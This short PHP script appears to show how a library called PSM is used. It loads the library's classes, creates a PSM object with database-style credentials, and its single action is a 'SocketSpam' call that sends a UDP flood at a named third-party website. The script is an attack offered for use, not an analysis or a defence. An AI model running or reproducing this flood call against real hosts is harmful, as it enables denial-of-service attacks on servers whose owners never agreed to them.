<?php
  # We use session_start for all our code cause sometimes PSM is required to load session data.
    session_start();
  # Class requiring.
    require "classes/PSMExtra.php";
    require "classes/PSMQuery.php";
    require "classes/PSMMain.php";
  # Make the PSM variable.
    $psm = new PSM('localhost test root EM',[
      'safeconnection' => true
    ]);
  # Done.
    echo $psm->SocketSpam(PSM::UDP, 'officialhda.weebly.com', false, 5, true);
